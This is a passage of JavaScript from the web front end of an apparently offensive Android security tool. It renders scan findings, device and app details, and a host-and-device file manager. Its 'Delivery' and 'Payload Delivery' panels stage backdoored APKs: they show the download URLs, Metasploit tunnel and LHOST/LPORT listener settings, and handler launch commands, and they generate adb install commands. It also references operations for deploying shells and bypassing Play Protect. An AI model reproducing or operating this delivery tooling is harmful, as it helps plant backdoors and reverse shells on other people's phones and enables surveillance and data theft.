  const total = vulns.length + fArr.length;
  findingsCount = total;
  const b = document.getElementById('findings-badge');
  if (total) { b.textContent = total; b.style.display = 'inline'; }
  const vb = document.getElementById('f-vuln-ct');
  if (vb && vulns.length) { vb.textContent = vulns.length; vb.style.display = 'inline'; }

  // P&D badge + auto-refresh QR view
  const hasDelivery = fArr.some(f => ['wan_expose','backdoor_apk','deploy_shell','bypass_play_protect','customize_apk'].includes(f.category));
  if (hasDelivery) {
    const pb = document.getElementById('pd-badge');
    if (pb) { pb.textContent = '●'; pb.style.display = 'inline'; }
    renderQRFromResult(result);
    pdRefreshQRView();
    // auto-fill built APK path if returned in findings
    const bkd = fArr.find(f => ['backdoor_apk','bypass_play_protect','customize_apk'].includes(f.category));
    if (bkd) {
      const apkPath = bkd.backdoored || bkd.patched_apk || bkd.apk || '';
      if (apkPath) {
        _pdBuiltApk = apkPath;
        const el = document.getElementById('pd-apk-path');
        if (el) el.value = apkPath;
      }
    }
  }

  if (errors.length) showToast(`${errors.length} error(s) — check Findings › Summary`, 'disconnect', 5000);

  renderFindingsPanel();
}

function fTab(name) {
  _fActiveTab = name;
  document.querySelectorAll('#f-toolbar .f-tab').forEach(t =>
    t.classList.toggle('active', t.dataset.ftab === name));
  renderFindingsPanel();
}

function renderFindingsPanel() {
  const body = document.getElementById('f-body');
  if (!_lastResult) {
    body.innerHTML = '<div id="f-empty" style="padding:24px 16px;color:var(--muted);font-size:0.7rem;text-align:center;">Run an operation — findings populate here automatically.</div>';
    return;
  }
  const data   = _lastResult.data  || {};
  const vulns  = data.vulnerabilities || [];
  const fArr   = data.findings        || [];
  const device = data.device          || null;
  const apps   = data.applications    || [];
  const sum    = data.summary         || {};
  const errors = _lastResult.errors   || [];

  body.innerHTML = '';
  const t = _fActiveTab;

  // ── SUMMARY ─────────────────────────────────────────────────────────────
  if (t === 'summary') {
    const sev = {CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0,INFO:0};
    vulns.forEach(v => { const s=v.severity||'INFO'; sev[s]=(sev[s]||0)+1; });

    let html = `<div class="f-summary-chips">`;
    for (const [s,n] of Object.entries(sev)) {
      if (n) html += `<span class="sev ${s}" style="cursor:pointer" onclick="fTab('vulns');filterVulns('${s}')">${n} ${s}</span>`;
    }
    html += `</div>`;

    html += `<div class="f-section"><div class="f-section-hdr" onclick="this.nextSibling.style.display=this.nextSibling.style.display==='none'?'':'none'">Operation info<span class="f-toggle">▾</span></div>
    <div class="f-section-body f-kv-grid">`;
    const kvs = [
      ['Operation', sum.operation||'—'],
      ['Timestamp', (sum.timestamp||'').replace('T',' ').slice(0,19)],
      ['Device', sum.device_serial||'auto'],
      ['Android', sum.android_version||'—'],
      ['Rooted', sum.device_rooted ? '⚠ YES' : 'no', sum.device_rooted ? 'warn':''],
      ['Root via', sum.root_method||'—'],
      ['Apps scanned', sum.apps_analyzed||0],
      ['Total vulns', sum.total_vulnerabilities||0],
      ['Work dir', sum.work_directory||'—'],
    ];
    for (const [k,v,cls=''] of kvs)
      html += `<div class="f-kv"><span class="fk">${k}</span><span class="fv ${cls}">${v}</span></div>`;
    html += `</div></div>`;

    if (errors.length) {
      html += `<div class="f-section"><div class="f-section-hdr" style="color:var(--red)">Errors (${errors.length})<span class="f-toggle">▾</span></div><div class="f-errors">`;
      errors.forEach(e => html += `<div class="f-err-item">${esc(e)}</div>`);
      html += `</div></div>`;
    }

    // other findings by category
    const cats = {};
    fArr.forEach(f => { (cats[f.category]=cats[f.category]||[]).push(f); });
    for (const [cat, items] of Object.entries(cats)) {
      if (['backdoor_apk','wan_expose','deploy_shell','objection_patch'].includes(cat)) continue;
      html += `<div class="f-section"><div class="f-section-hdr" onclick="this.nextSibling.style.display=this.nextSibling.style.display==='none'?'':'none'">${cat} (${items.length})<span class="f-toggle">▾</span></div><div class="f-section-body">`;
      items.forEach(f => {
        const txt = f.finding || f.desc || f.summary || JSON.stringify(f);
        html += `<div class="f-vuln-row"><div class="f-vuln-text">${esc(txt)}</div></div>`;
      });
      html += `</div></div>`;
    }
    body.innerHTML = html;
  }

  // ── VULNS ────────────────────────────────────────────────────────────────
  else if (t === 'vulns') {
    if (!vulns.length) { body.innerHTML = `<div style="padding:20px;color:var(--muted);text-align:center;font-size:0.7rem;">No vulnerabilities found.</div>`; return; }
    const sevs = ['ALL','CRITICAL','HIGH','MEDIUM','LOW','INFO'];
    let html = `<div class="f-filter-row">`;
    sevs.forEach(s => html += `<button class="f-filt ${s} ${_fVulnFilter===s?'on':''}" onclick="filterVulns('${s}')">${s}</button>`);
    html += `</div><div id="f-vuln-list">`;
    const filtered = _fVulnFilter === 'ALL' ? vulns : vulns.filter(v => (v.severity||'INFO') === _fVulnFilter);
    filtered.forEach(v => {
      const sev = v.severity||'INFO';
      const title = v.id || v.type || v.check || v.title || 'Finding';
      const desc  = v.desc || v.description || v.details || v.finding || '';
      const rec   = v.recommendation || v.fix || '';
      const cves  = (v.cves||[]).join(', ') || v.cve || '';
      html += `<div class="f-vuln-row">
        <span class="sev ${sev}" style="flex-shrink:0">${sev}</span>
        <div class="f-vuln-text">
          <b>${esc(title)}</b>${desc ? esc(desc) : ''}
          ${rec ? `<div class="f-rec">⤷ ${esc(rec)}</div>` : ''}
        </div>
        ${cves ? `<span class="f-cve">${esc(cves)}</span>` : ''}
      </div>`;
    });
    html += `</div>`;
    body.innerHTML = html;
  }

  // ── DEVICE ───────────────────────────────────────────────────────────────
  else if (t === 'device') {
    if (!device) { body.innerHTML = `<div style="padding:20px;color:var(--muted);text-align:center;font-size:0.7rem;">No device data in this result.</div>`; return; }
    const fields = [
      ['Model',         device.model],
      ['Manufacturer',  device.manufacturer],
      ['Android',       device.android_version],
      ['SDK',           device.sdk_version],
      ['Arch',          device.architecture],
      ['Serial',        device.serial||'auto'],
      ['Rooted',        device.rooted ? '⚠ YES':'no', device.rooted?'warn':'ok'],
      ['Root method',   device.root_method||'—'],
      ['SELinux',       device.selinux_status],
      ['Encryption',    device.encryption_status],
      ['Screen lock',   device.screen_lock?'yes':'no'],
      ['Dev mode',      device.developer_mode?'on':'off', device.developer_mode?'warn':''],
      ['USB debug',     device.usb_debugging?'on':'off', device.usb_debugging?'warn':''],
      ['Bootloader',    device.bootloader_unlocked?'UNLOCKED':'locked', device.bootloader_unlocked?'crit':''],
      ['Battery',       device.battery_level!=null ? device.battery_level+'%':'—'],
      ['Security patch',device.security_patch],
      ['Kernel',        device.kernel_version],
      ['Chipset',       device.chipset],
      ['Fingerprint',   device.fingerprint],
    ];
    let html = `<div class="f-section"><div class="f-section-hdr">Device</div><div class="f-section-body f-kv-grid">`;
    fields.forEach(([k,v,cls='']) => v != null
      ? html += `<div class="f-kv"><span class="fk">${k}</span><span class="fv ${cls}" title="${esc(String(v))}">${esc(String(v)).slice(0,60)}</span></div>`
      : '');
    html += `</div></div>`;
    body.innerHTML = html;
  }

  // ── APPS ─────────────────────────────────────────────────────────────────
  else if (t === 'apps') {
    if (!apps.length) { body.innerHTML = `<div style="padding:20px;color:var(--muted);text-align:center;font-size:0.7rem;">No app profiles. Run app_scan or full to populate.</div>`; return; }
    let html = '';
    apps.forEach(app => {
      const score = app.security_score ?? '—';
      const scoreClass = score < 40 ? 'crit' : score < 70 ? 'warn' : 'ok';
      html += `<div class="f-section">
        <div class="f-section-hdr" onclick="this.nextSibling.style.display=this.nextSibling.style.display==='none'?'':'none'">
          ${esc(app.package||'?')} <span class="f-score sev ${score<40?'CRITICAL':score<70?'MEDIUM':'INFO'}">${score}/100</span>
          <span class="f-toggle">▾</span>
        </div>
        <div class="f-section-body f-kv-grid">`;
      const akvs = [
        ['Version', app.version_name],['Min SDK',app.min_sdk],['Target SDK',app.target_sdk],
        ['Debuggable',app.debuggable?'⚠ YES':'no',app.debuggable?'warn':''],
        ['Allow backup',app.allow_backup?'⚠ YES':'no',app.allow_backup?'warn':''],
        ['Network clear',app.network_cleartext?'⚠ YES':'no',app.network_cleartext?'warn':''],
        ['Exported act.',app.exported_activities?.length||0],
        ['Exported svc.',app.exported_services?.length||0],
        ['Exported recv.',app.exported_receivers?.length||0],
        ['Dangerous perms',(app.dangerous_permissions||[]).length],
        ['Secrets found',(app.secrets_found||[]).length,(app.secrets_found?.length?'crit':'')],
      ];
      akvs.forEach(([k,v,cls='']) => v != null
        ? html += `<div class="f-kv"><span class="fk">${k}</span><span class="fv ${cls}">${esc(String(v))}</span></div>` : '');
      if (app.secrets_found?.length) {
        html += `</div><div style="padding:6px 14px;border-top:1px solid var(--border2)">`;
        app.secrets_found.forEach(s => html += `<div class="f-err-item" style="margin-bottom:4px">${esc(s.type||'secret')}: ${esc(s.value||'').slice(0,60)}</div>`);
      }
      html += `</div></div>`;
    });
    body.innerHTML = html;
  }

  // ── DELIVERY ─────────────────────────────────────────────────────────────
  else if (t === 'delivery') {
    const wanF  = fArr.find(f => f.category === 'wan_expose');
    const bkdF  = fArr.find(f => f.category === 'backdoor_apk' || f.category === 'deploy_shell' || f.category === 'objection_patch');
    if (!wanF && !bkdF) {
      body.innerHTML = `<div style="padding:20px;color:var(--muted);text-align:center;font-size:0.7rem;">No delivery info. Run backdoor_apk or deploy_shell.</div>`;
      return;
    }
    let html = '<div class="f-delivery">';

    if (wanF?.apk_download_url) {
      html += `<div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:6px;">APK Download URL</div>
      <div class="f-del-url">
        <span class="f-url-text">${esc(wanF.apk_download_url)}</span>
        <button class="f-del-btn primary" onclick="copyText('${esc(wanF.apk_download_url)}')">copy</button>
        <a class="f-del-btn" href="${esc(wanF.apk_download_url)}" target="_blank">open ↗</a>
      </div>`;
    }
    if (wanF?.msf_tunnel_url) {
      html += `<div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin:10px 0 6px">MSF Tunnel</div>
      <div class="f-del-url">
        <span class="f-url-text">${esc(wanF.msf_tunnel_url)}</span>
        <button class="f-del-btn" onclick="copyText('${esc(wanF.msf_tunnel_url)}')">copy</button>
      </div>`;
    }

    const handlerRc = wanF?.handler_rc || bkdF?.handler_rc;
    const launchCmd = wanF?.launch_cmd || bkdF?.catch_cmd || bkdF?.launch_cmd;
    if (launchCmd) {
      html += `<div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin:10px 0 6px">Handler</div>
      <div class="f-del-cmd"><code>${esc(launchCmd)}</code><button class="f-del-btn" onclick="copyText('${esc(launchCmd)}')">copy</button></div>`;
    }

    const apkPath = bkdF?.backdoored || bkdF?.apk || bkdF?.patched_apk;
    if (apkPath) {
      const installCmd = `adb install -r "${apkPath}"`;
      html += `<div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin:10px 0 6px">Manual Install</div>
      <div class="f-del-cmd"><code>${esc(installCmd)}</code><button class="f-del-btn" onclick="copyText('${esc(installCmd)}')">copy</button></div>`;
    }

    const lhost = wanF?.msf_lhost || bkdF?.lhost || '—';
    const lport = wanF?.msf_lport || bkdF?.lport || '—';
    html += `<div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin:10px 0 6px">Listener</div>
    <div class="f-del-url" style="gap:16px">
      <span class="f-url-text">LHOST: <b style="color:var(--white)">${esc(String(lhost))}</b></span>
      <span class="f-url-text">LPORT: <b style="color:var(--white)">${esc(String(lport))}</b></span>
      <button class="f-del-btn" onclick="copyText('${esc(lhost)}:${esc(String(lport))}')">copy</button>
    </div>`;

    html += '</div>';

    // QR codes captured from terminal (ASCII art)
    if (qrList.length) {
      html += `<div style="padding:0 14px 8px">`;
      qrList.forEach(q => {
        if (q.startsWith('URL:')) return;
        html += `<div class="f-del-qr">${q.replace(/&/g,'&amp;').replace(/</g,'&lt;')}</div>`;
      });
      html += `</div>`;
    }

    body.innerHTML = html;
  }

  // ── RAW JSON ─────────────────────────────────────────────────────────────
  else if (t === 'raw') {
    const pre = document.createElement('pre');
    pre.className = 'f-raw';
    pre.style.cssText = 'padding:14px;font-size:0.65rem;color:var(--muted);overflow:auto;white-space:pre;';
    pre.textContent = JSON.stringify(_lastResult, null, 2);
    const wrap = document.createElement('div'); wrap.className = 'f-raw';
    wrap.appendChild(pre);
    body.appendChild(wrap);
  }
}

function filterVulns(sev) {
  _fVulnFilter = sev;
  if (_fActiveTab !== 'vulns') fTab('vulns'); else renderFindingsPanel();
}

function clearFindings() {
  _lastResult = null; _fVulnFilter = 'ALL'; _fActiveTab = 'summary';
  findingsCount = 0;
  const b = document.getElementById('findings-badge'); if (b) { b.textContent='0'; b.style.display='none'; }
  const vb = document.getElementById('f-vuln-ct'); if (vb) { vb.style.display='none'; }
  renderFindingsPanel();
}

function exportFindings() {
  if (!_lastResult) return;
  const blob = new Blob([JSON.stringify(_lastResult, null, 2)], {type:'application/json'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'secv_findings_' + Date.now() + '.json';
  a.click();
}

function copyText(txt) {
  navigator.clipboard.writeText(txt).then(() => showToast('Copied!', 'connect', 1500));
}

function esc(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

// re-render delivery tab when QR captured from terminal
function renderQRFromResult(result) {
  // already populated via handleResult; if delivery tab active, re-render
  if (_fActiveTab === 'delivery') renderFindingsPanel();
}

// ── QR ────────────────────────────────────────────────────────────────────────
function loadQR() {
  fetch('/api/qr').then(r => r.json()).then(d => {
    qrList = d.qr || [];
    qrCount = qrList.length;
    const b = document.getElementById('qr-badge');
    if (qrCount) { b.textContent = qrCount; b.style.display = 'inline'; }
    renderQR();
  });
}

function renderQR() {
  const panel = document.getElementById('qr-panel');
  panel.innerHTML = '';

  // pull delivery info from last result if available
  const fArr = _lastResult?.data?.findings || [];
  const wanF = fArr.find(f => f.category === 'wan_expose');
  const bkdF = fArr.find(f => ['backdoor_apk','deploy_shell','objection_patch'].includes(f.category));

  let html = '';

  if (wanF || bkdF) {
    const apkUrl    = wanF?.apk_download_url || '';
    const msfTunnel = wanF?.msf_tunnel_url   || '';
    const lhost     = wanF?.msf_lhost || bkdF?.lhost || '';
    const lport     = wanF?.msf_lport || bkdF?.lport || '';
    const launchCmd = wanF?.launch_cmd || bkdF?.catch_cmd || bkdF?.launch_cmd || '';
    const apkPath   = bkdF?.backdoored || bkdF?.apk || bkdF?.patched_apk || '';
    const payload   = bkdF?.payload || '';

    html += `<div class="qr-card">
      <div style="color:var(--muted);font-size:0.58rem;letter-spacing:0.12em;text-transform:uppercase;margin-bottom:10px;">Payload Delivery</div>`;

    if (payload) html += `<div style="font-size:0.62rem;color:var(--muted);margin-bottom:8px">payload: <span style="color:var(--white)">${esc(payload)}</span></div>`;

    if (apkUrl) html += `
      <div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:4px">APK Download URL</div>
      <div class="qr-url" style="margin-bottom:8px">${esc(apkUrl)}</div>
      <div style="display:flex;gap:6px;margin-bottom:12px">
        <button class="f-del-btn primary" onclick="copyText('${esc(apkUrl)}')">copy URL</button>
        <a class="f-del-btn" href="${esc(apkUrl)}" target="_blank" style="text-decoration:none">open ↗</a>
      </div>`;

    if (msfTunnel) html += `
      <div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:4px">MSF Tunnel</div>
      <div class="qr-url" style="margin-bottom:8px">${esc(msfTunnel)}</div>
      <button class="f-del-btn" onclick="copyText('${esc(msfTunnel)}')" style="margin-bottom:12px">copy</button>`;

    if (lhost && lport) html += `
      <div style="display:flex;gap:20px;align-items:center;padding:8px 0;border-top:1px solid var(--border2);border-bottom:1px solid var(--border2);margin-bottom:12px">
        <div><span style="font-size:0.58rem;color:var(--muted)">LHOST</span><div style="font-family:var(--mono);font-size:0.78rem;color:var(--white)">${esc(String(lhost))}</div></div>
        <div><span style="font-size:0.58rem;color:var(--muted)">LPORT</span><div style="font-family:var(--mono);font-size:0.78rem;color:var(--white)">${esc(String(lport))}</div></div>
        <button class="f-del-btn" onclick="copyText('${esc(lhost)}:${esc(String(lport))}')">copy</button>
      </div>`;

    if (launchCmd) html += `
      <div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:4px">Start Handler</div>
      <div class="f-del-cmd" style="margin-bottom:8px"><code>${esc(launchCmd)}</code><button class="f-del-btn" onclick="copyText('${esc(launchCmd)}')">copy</button></div>`;

    if (apkPath) html += `
      <div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:4px">Manual ADB Install</div>
      <div class="f-del-cmd"><code>adb install -r "${esc(apkPath)}"</code><button class="f-del-btn" onclick="copyText('adb install -r \\"${esc(apkPath)}\\"')">copy</button></div>`;

    html += `</div>`;
  }

  // ASCII QR codes captured from terminal
  for (const q of qrList) {
    const card = document.createElement('div'); card.className = 'qr-card';
    if (q.startsWith('URL:')) {
      const url = q.replace('URL: ','').trim();
      card.innerHTML = `<div style="color:var(--muted);font-size:0.58rem;letter-spacing:0.12em;text-transform:uppercase;margin-bottom:6px">Delivery URL</div>
        <div class="qr-url" style="margin-bottom:8px">${esc(url)}</div>
        <button class="f-del-btn" onclick="copyText('${esc(url)}')">copy</button>`;
    } else {
      card.innerHTML = `<div style="color:var(--muted);font-size:0.58rem;letter-spacing:0.12em;text-transform:uppercase;margin-bottom:6px">QR Code</div>
        <pre style="color:var(--green);font-size:0.62rem;line-height:1.0">${q.replace(/&/g,'&amp;').replace(/</g,'&lt;')}</pre>`;
    }
    panel.innerHTML += card.outerHTML;
  }

  if (!html && !qrList.length)
    panel.innerHTML = '<div style="padding:20px;color:var(--muted);font-size:0.7rem;text-align:center;">Run backdoor_apk or deploy_shell — delivery info appears here automatically.</div>';
  else
    panel.innerHTML = html + panel.innerHTML;
}

// ── Files ─────────────────────────────────────────────────────────────────────
// ── File Manager ──────────────────────────────────────────────────────────────
let fmHostPath = '';
let fmDevPath  = '/sdcard';
let fmHostSel  = null;   // selected host entry
let fmDevSel   = null;   // selected device entry

function loadFiles() {
  if (!fmHostPath) fmHostPath = document.getElementById('fm-host-path-inp')?.value || '';
  fmHostNav(fmHostPath || null);
  fmDevNav(fmDevPath);
}

function _fmFmt(size) {
  if (size > 1048576) return (size/1048576).toFixed(1)+'MB';
  if (size > 1024)    return (size/1024).toFixed(1)+'KB';
  return size+'B';
}

function _fmIco(entry) {
  if (entry.type === 'dir') return '📁';
  const e = (entry.ext||entry.name||'').toLowerCase();
  if (e.endsWith('.apk')||e.endsWith('.aab')) return '📦';
  if (e.endsWith('.txt')||e.endsWith('.log')) return '📄';
  if (e.endsWith('.json')||e.endsWith('.yml')||e.endsWith('.yaml')) return '🗒';
  if (e.endsWith('.py')||e.endsWith('.js')||e.endsWith('.smali')) return '📝';
  if (e.endsWith('.png')||e.endsWith('.jpg')||e.endsWith('.jpeg')) return '🖼';
  if (e.endsWith('.zip')||e.endsWith('.tar')||e.endsWith('.gz'))   return '🗜';
  return '📄';
}

function _fmEntryClass(entry) {
  if (entry.type === 'dir') return 'fm-entry fm-dir';
  const e = (entry.ext||entry.name||'').toLowerCase();
  if (e.endsWith('.apk')||e.endsWith('.aab')) return 'fm-entry fm-file fm-apk';
  return 'fm-entry fm-file';
}

function fmBreadcrumb(path, clickFn) {
  const parts = path.replace(/\/+/g,'/').split('/').filter(Boolean);
  let html = `<span class="fm-bc-seg" onclick="${clickFn}('/')">/ root</span>`;
  let acc = '';
  for (const p of parts) {
    acc += '/' + p;
    const _acc = acc;
    html += `<span class="fm-bc-sep"> › </span><span class="fm-bc-seg" onclick="${clickFn}('${_acc.replace(/'/g,"\\'")}');return false;">${esc(p)}</span>`;
  }
  return html;
}

function fmHostNav(path) {
  const list   = document.getElementById('fm-host-list');
  const status = document.getElementById('fm-host-status');
  const bc     = document.getElementById('fm-host-bc');
  const inp    = document.getElementById('fm-host-path-inp');
  if (!path) path = (inp&&inp.value) || (window._fmHomePath||'/root');
  list.innerHTML = '<div class="fm-empty">Loading…</div>';
  fetch(`/api/fs/list?path=${encodeURIComponent(path)}`)
    .then(r => r.json()).then(d => {
      if (d.error) { list.innerHTML = `<div class="fm-empty" style="color:var(--red)">${esc(d.error)}</div>`; return; }
      fmHostPath = d.path;
      if (inp) inp.value = d.path;
      if (bc) bc.innerHTML = fmBreadcrumb(d.path, 'fmHostNav');
      if (d.parent) {
        bc.innerHTML = `<span class="fm-bc-seg" onclick="fmHostNav('${d.parent.replace(/'/g,"\\'")}')">.. parent</span> ` + bc.innerHTML;
      }
      list.innerHTML = '';
      const entries = d.entries || [];
      document.getElementById('fm-host-count').textContent = entries.length + ' items';
      if (!entries.length) { list.innerHTML = '<div class="fm-empty">Empty directory</div>'; return; }
      for (const e of entries) {
        const row = document.createElement('div');
        row.className  = _fmEntryClass(e);
        row.title      = e.path;
        const isApk    = (e.ext||'').toLowerCase() === '.apk' || (e.ext||'').toLowerCase() === '.aab';
        row.innerHTML  = `<span class="fm-ico">${_fmIco(e)}</span>
          <span class="fm-name">${esc(e.name)}${isApk?' <span class="fm-apk-badge">APK</span>':''}</span>
          <span class="fm-size">${e.type==='file'?_fmFmt(e.size):''}</span>`;
        row.addEventListener('click', () => fmHostSelect(e, row));
        row.addEventListener('dblclick', () => {
          if (e.type === 'dir') fmHostNav(e.path);
          else fmPreview(e, 'host');
        });
        row.addEventListener('contextmenu', ev => { ev.preventDefault(); fmCtxMenu(ev, e, 'host'); });
        list.appendChild(row);
      }
      status && (status.textContent = d.path);
    }).catch(err => { list.innerHTML = `<div class="fm-empty" style="color:var(--red)">${err}</div>`; });
}

function fmDevNav(path) {
  const serial = document.querySelector('#dev-select')?.value || '';
  const list   = document.getElementById('fm-dev-list');
  const status = document.getElementById('fm-dev-status');
  const bc     = document.getElementById('fm-dev-bc');
  if (!path) path = fmDevPath;
  list.innerHTML = '<div class="fm-empty">Loading…</div>';
  fetch(`/api/device/fs/list?serial=${encodeURIComponent(serial)}&path=${encodeURIComponent(path)}`)
    .then(r => r.json()).then(d => {
      if (d.error && !d.entries?.length) {
        list.innerHTML = `<div class="fm-empty" style="color:var(--red);">${esc(d.error||'No device')}</div>`; return;
      }
      fmDevPath = d.path;
      if (bc) bc.innerHTML = fmBreadcrumb(d.path, 'fmDevNav');
      if (d.parent) {
        bc.innerHTML = `<span class="fm-bc-seg" onclick="fmDevNav('${d.parent.replace(/'/g,"\\'")}')">.. parent</span> ` + bc.innerHTML;
      }
      list.innerHTML = '';
      const entries = d.entries || [];
      document.getElementById('fm-dev-count').textContent = entries.length + ' items';
      if (!entries.length) { list.innerHTML = '<div class="fm-empty">Empty or permission denied</div>'; return; }
      for (const e of entries) {
        const row = document.createElement('div');
        row.className = _fmEntryClass(e);
        row.title     = e.path;
        row.innerHTML = `<span class="fm-ico">${_fmIco(e)}</span>
          <span class="fm-name">${esc(e.name)}</span>
          <span class="fm-perms">${e.perms||''}</span>
          <span class="fm-size">${e.type==='file'?e.size:''}</span>`;
        row.addEventListener('click', () => fmDevSelect(e, row));
        row.addEventListener('dblclick', () => { if (e.type === 'dir') fmDevNav(e.path); });
        row.addEventListener('contextmenu', ev => { ev.preventDefault(); fmCtxMenu(ev, e, 'device'); });
        list.appendChild(row);
      }
      status && (status.textContent = d.path);
    }).catch(err => { list.innerHTML = `<div class="fm-empty" style="color:var(--red)">${err}</div>`; });
}

function fmHostSelect(entry, row) {
  document.querySelectorAll('#fm-host-list .fm-entry').forEach(r => r.classList.remove('selected'));
  row.classList.add('selected');
  fmHostSel = entry;
  fmPreview(entry, 'host');
}

function fmDevSelect(entry, row) {
  document.querySelectorAll('#fm-dev-list .fm-entry').forEach(r => r.classList.remove('selected'));
  row.classList.add('selected');
  fmDevSel = entry;
  fmPreview(entry, 'device');
}

function fmPreview(entry, side) {
  const hdr  = document.getElementById('fm-preview-hdr');
  const body = document.getElementById('fm-preview-content');
  const isApk = (entry.ext||entry.name||'').toLowerCase().endsWith('.apk') ||
                (entry.ext||entry.name||'').toLowerCase().endsWith('.aab');
  if (hdr) hdr.textContent = entry.name;
  let html = `<div class="fm-prev-meta">${entry.path}<br>`;
  if (entry.size) html += `Size: ${_fmFmt(parseInt(entry.size)||0)} · `;
  html += `Type: ${entry.type}</div>`;

  if (entry.type === 'dir') {
    html += `<div style="color:var(--muted);font-size:0.65rem;">Double-click to navigate</div>`;
    html += `<div class="fm-prev-actions">`;
    if (side === 'device') html += `<button class="fm-tb-btn" onclick="fmPullDir()">⬇ pull dir</button>`;
    if (side === 'host')   html += `<button class="fm-tb-btn" onclick="fmPushToDevice()">⬆ push to device</button>`;
    html += `</div>`;
  } else if (isApk) {
    html += `<div class="fm-prev-actions">`;
    if (side === 'host') {
      html += `<button class="fm-tb-btn go" onclick="fmUseApk('${entry.path.replace(/'/g,"\\'")}')">▶ use in ops</button>`;
      html += `<button class="fm-tb-btn" onclick="fmDecompile('${entry.path.replace(/'/g,"\\'")}')">⊕ decompile</button>`;
      html += `<button class="fm-tb-btn" onclick="fmDownload('${entry.path.replace(/'/g,"\\'")}')">⬇ download</button>`;
    }
    if (side === 'device') {
      html += `<button class="fm-tb-btn go" onclick="fmPullApk()">⬇ pull APK</button>`;
      html += `<button class="fm-tb-btn" onclick="fmPushToDevice()">⬆ push APK</button>`;
    }
    html += `</div>`;
  } else if (side === 'host' && entry.type === 'file') {
    fetch(`/api/fs/read?path=${encodeURIComponent(entry.path)}`)
      .then(r => r.json()).then(d => {
        let content = '';
        if (d.binary) {
          content = `<div style="color:var(--muted);font-size:0.62rem;">Binary file (${_fmFmt(d.size)})</div>`;
        } else if (d.text) {
          const preview = esc(d.text.slice(0, 3000));
          content = `<pre class="fm-prev-text">${preview}${d.text.length>3000?'\n…(truncated)':''}</pre>`;
        } else if (d.error) {
          content = `<div style="color:var(--muted)">${esc(d.error)}</div>`;
        }
        const el = document.getElementById('fm-preview-content');
        if (el) el.innerHTML += content + `<div class="fm-prev-actions">
          <button class="fm-tb-btn" onclick="fmDownload('${entry.path.replace(/'/g,"\\'")}')">⬇ download</button>
          <button class="fm-tb-btn" onclick="navigator.clipboard.writeText('${entry.path.replace(/'/g,"\\'")}')">copy path</button>
          <button class="fm-tb-btn danger" onclick="fmDelete('${entry.path.replace(/'/g,"\\'")}','host')">✕ delete</button>
        </div>`;
      });
  } else if (side === 'device' && entry.type === 'file') {
    html += `<div class="fm-prev-actions">
      <button class="fm-tb-btn go" onclick="fmPullFile()">⬇ pull to host</button>
      <button class="fm-tb-btn" onclick="fmPushToDevice()">⬆ push file</button>
    </div>`;
  }
  if (body) body.innerHTML = html;
}

function fmCtxMenu(ev, entry, side) {
  const ctx = document.getElementById('fm-ctx');
  ctx.style.display = 'block';
  ctx.style.left    = ev.pageX + 'px';
  ctx.style.top     = ev.pageY + 'px';
  const isApk = (entry.ext||entry.name||'').toLowerCase().endsWith('.apk');
  let items = [];
  if (side === 'host') {
    items.push(['copy path', () => navigator.clipboard.writeText(entry.path)]);
    if (entry.type === 'file') {
      items.push(['download', () => fmDownload(entry.path)]);
      if (isApk) {
        items.push(['use in ops', () => fmUseApk(entry.path)]);
        items.push(['decompile APK', () => fmDecompile(entry.path)]);
      }
      items.push(null);
      items.push(['delete', () => fmDelete(entry.path, 'host'), true]);
    } else {
      items.push(['rename', () => fmRename(entry.path, 'host')]);
      items.push(null);
      items.push(['delete dir', () => fmDelete(entry.path, 'host'), true]);
    }
  } else {
    items.push(['pull to host', () => fmPullFileEntry(entry)]);
    if (isApk) items.push(['pull APK + decompile', () => fmPullAndDecompile(entry)]);
    items.push(['push file here', () => fmPushToPath(entry.path)]);
    items.push(['copy path', () => navigator.clipboard.writeText(entry.path)]);
  }
  ctx.innerHTML = '';
  const callbacks = [];
  for (const i of items) {
    if (i === null) { const sep = document.createElement('div'); sep.className='fm-ctx-sep'; ctx.appendChild(sep); continue; }
    const el = document.createElement('div');
    el.className = 'fm-ctx-item' + (i[2]?' danger':'');
    el.textContent = i[0];
    const fn = i[1];
    el.addEventListener('click', () => { ctx.style.display='none'; fn(); });
    ctx.appendChild(el);
  }
  const clickOut = e => { if (!ctx.contains(e.target)) { ctx.style.display='none'; document.removeEventListener('click', clickOut); } };
  setTimeout(() => document.addEventListener('click', clickOut), 50);
}

function fmDownload(path) {
  const a = document.createElement('a');
  a.href = '/api/fs/download?path=' + encodeURIComponent(path);
  a.download = path.split('/').pop();
  a.click();
}

function fmUseApk(path) {
  const apkInp = document.querySelector('.param-field[data-name="apk_path"]');
  if (apkInp) {
    apkInp.value = path;
    termLine(`\x1b[32m[fm] APK path set: ${path}\x1b[0m`);
    switchTab('terminal');
  } else {
    navigator.clipboard.writeText(path);
    termLine(`\x1b[33m[fm] No apk_path field visible — path copied to clipboard: ${path}\x1b[0m`);
  }
}

function fmDecompile(path) {
  termLine(`\x1b[36m[fm] Decompiling ${path}…\x1b[0m`);
  switchTab('terminal');
  fetch('/api/apk/decompile', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({apk: path})
  }).then(r => r.json()).then(d => {
    if (d.ok) {
      termLine(`\x1b[32m[fm] Decompiled → ${d.out_dir}\x1b[0m`);
      fmHostNav(d.out_dir);
    } else {
      termLine(`\x1b[31m[fm] Decompile failed: ${d.error||d.stderr}\x1b[0m`);
    }
  });
}

function fmRecompile(srcDir) {
  termLine(`\x1b[36m[fm] Recompiling ${srcDir}…\x1b[0m`);
  switchTab('terminal');
  fetch('/api/apk/recompile', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({src: srcDir, sign: true})
  }).then(r => r.json()).then(d => {
    if (d.ok) {
